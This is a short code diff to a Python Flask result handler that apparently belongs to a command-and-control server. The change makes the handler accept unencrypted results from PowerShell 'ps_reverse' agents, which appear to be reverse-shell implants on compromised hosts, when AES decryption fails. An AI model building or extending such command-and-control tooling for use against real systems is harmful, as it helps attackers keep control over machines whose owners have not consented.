@@ -318,8 +318,19 @@ def result():
             continue
 
     if data is None:
-        print("[!] Failed to decrypt result with any known AES key.")
-        return jsonify({"error": "Unable to decrypt result"}), 400
+        # Try fallback plaintext for PS agents only
+        try:
+            fallback_payload = json.loads(encrypted)
+            if fallback_payload.get("payload", "").lower() == "ps_reverse":
+                print("[*] Fallback plaintext result accepted from PowerShell agent")
+                data = fallback_payload
+            else:
+                print("[!] Plaintext fallback rejected: not ps_reverse")
+                return jsonify({"error": "Unable to decrypt result"}), 400
+        except Exception as ex:
+            print(f"[!] Fallback JSON parse failed: {ex}")
+            return jsonify({"error": "Unable to decrypt result"}), 400
+
 
     hostname = data.get("hostname")
     command = data.get("command")
